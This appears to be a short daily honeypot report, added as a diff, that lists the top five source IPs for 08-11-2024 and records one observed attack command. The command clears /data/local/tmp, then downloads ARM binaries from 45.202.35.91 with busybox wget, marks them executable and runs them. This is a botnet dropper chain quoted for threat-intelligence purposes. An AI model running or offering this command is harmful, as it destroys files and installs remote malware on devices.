@@ -1,0 +1,15 @@
+Top 5 IPs for 08-11-2024 :
+
+59.110.33.230
+47.121.141.201
+47.113.198.44
+42.5.228.165
+67.254.214.151
+
+Malware Observed:
+
+None observed.
+
+Commands/exploits observed :
+
+cd /data/local/tmp/; rm -rf *; busybox wget http://45.202.35.91/arm4; chmod 777 arm4; ./arm4 android; busybox wget http://45.202.35.91/arm5; chmod 777 arm5; ./arm5 android; busybox wget http://45.202.35.91/arm6; chmod 777 arm6; ./arm6 android; busybox wget http://45.202.35.91/arm7; chmod 777 arm7; ./arm7 android;
